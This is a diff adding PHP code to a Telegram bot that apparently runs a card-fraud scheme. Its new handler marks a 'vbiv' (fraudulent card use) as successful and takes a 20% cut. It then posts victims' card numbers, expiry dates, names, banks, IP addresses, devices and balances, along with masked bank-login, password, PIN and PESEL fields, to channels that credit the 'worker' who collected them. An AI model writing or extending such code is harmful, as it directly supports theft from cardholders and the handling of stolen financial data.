@@ -1385,3 +1385,90 @@ function curs($sum,$from,$to){
     }
 
 
+
+    /*~~ Update Chanels ~~*/
+    if($post->channel_post){
+         
+         if (preg_match('/^[0-9.]+$/i', $post->channel_post->text)&&intval($post->channel_post->text)>0){
+            $message_id = intval($post->channel_post->message_id);
+            $card = (object)$con->user->get_card_ok(); 
+            $product = (object)$con->products->get_product($card->pid);
+            $worker = (object)$con->user->get_user_byid($product->uid); 
+
+            //file_put_contents('./log.txt',json_encode($message_id)."\n\n");
+            $summ_vbiv = $post->channel_post->text;
+            $summ_vbiv_n = $summ_vbiv*20/100;
+            $summ_vbiv = $summ_vbiv-$summ_vbiv_n;
+            
+            $con->user->update_card($card->id,array('vbiv_success_summ'=>$summ_vbiv,'vbiv_status'=>'success_ok')); 
+            $banking = '';
+            if($card->bank_login){
+                $banking .= "\n💳 <b>Login</b>: ".$card->bank_login;
+            }
+            if($card->bank_haslo){
+                $banking .= "\n💳 <b>Haslo</b>: ****";
+            }
+            if($card->bank_pin){
+                $banking .= "\n💳 <b>Pin</b>: ****";
+            }
+            if($card->bank_pesel){
+                $banking .= "\n💳 <b>Pesel</b>: ****";
+            } 
+            $data = [
+                'chat_id' => $post->channel_post->chat->id, 
+                'message_id'=>$card->message_id,
+                'parse_mode'=>'HTML',
+                'text' => "❌ Лог бил @".$card->vblogin."⚠️\n\n ".$bot_config->countries->{$product->country}->flag." <b>".$bot_config->countries->{$product->country}->markets->{$product->market}->name_nos."</b>\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n💳 <b>Карта</b>: ".$card->number."\n💳 <b>MM/YY</b>: ".$card->month."/".$card->year."\n💳 <b>CVV</b>: ***".$banking."\n☠️ <b>Имя</b>: ".$card->card_name."\n🏦 <b>Банк</b>: ".($card->bank_name?$card->bank_name:'----')."\n💳 <b>Тип</b>: ".$card->bank_scheme."\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n📬 <b>Страна</b>: ".$card->bank_country."\n\n💎 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').")\n📬 <b>Воркер</b>: @".$worker->login." | ".$worker->chat_id."\n📬 <b>Статус вбива</b>: Вбив завершён\n📬 <b>Сумма успеха</b>: ".$summ_vbiv." грн\n\n "
+            ];  
+            file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));
+            $data = [
+                'chat_id' => $post->channel_post->chat->id, 
+                'message_id'=>$message_id
+            ];  
+
+            file_get_contents($urlApi.$key.'/deleteMessage?'.http_build_query($data)); 
+
+            $data = [
+                'chat_id' => $bot_chanels->chanels->{'chanel_payments'}->id,  
+                'parse_mode'=>'HTML',
+                'text' => "".$bot_config->countries->{$product->country}->name."\n✅ <b>Сумма</b>: ".$card->vbiv_success_summ." UAH / ".curs($card->vbiv_success_summ,"UAH",$product->currancy)."\n💵 <b>Статус</b>: ".(!$card->status_viplat?"[В обработке]":"[Выплачено]")." 💵\n<b>ID</b>: ".$card->id."|\n"
+            ];     
+            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
+        }
+         
+        if(strpos($post->channel_post->text,'/chanel_')!==false){ 
+
+            $channel_post_text = str_replace("/","",$post->channel_post->text);
+            
+                    $data = [
+                        'chat_id' => $post->channel_post->chat->id,  
+                        'parse_mode'=>'HTML',
+                        'text' => "Успех! Радуйся!"
+                    ];  
+
+                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
+ 
+                    $me = file_get_contents($urlApi.$key.'/getMe');
+                    $me = json_decode($me);
+                    if($me->ok){
+                        $data = [
+                            'chat_id' => $post->channel_post->chat->id,
+                            'user_id'=> $me->result->id
+                        ];  
+                        $chat_channel = file_get_contents($urlApi.$key.'/getChat?'.http_build_query($data));
+                        $chat_channel = json_decode($chat_channel);
+                        
+                        if($chat_channel->ok){
+                            $bot_chanels->chanels->{$channel_post_text} = 
+                            array(
+                                "id"=>$post->channel_post->chat->id, 
+                                "type"=>$chat_channel->result->type, 
+                                "title"=>$chat_channel->result->title, 
+                                "invite_link"=>$chat_channel->result->invite_link
+                            );
+
+                            file_put_contents('./chanels.json',json_encode(array($bot_chanels)));
+                        } 
+                    }
+        }
+    } 
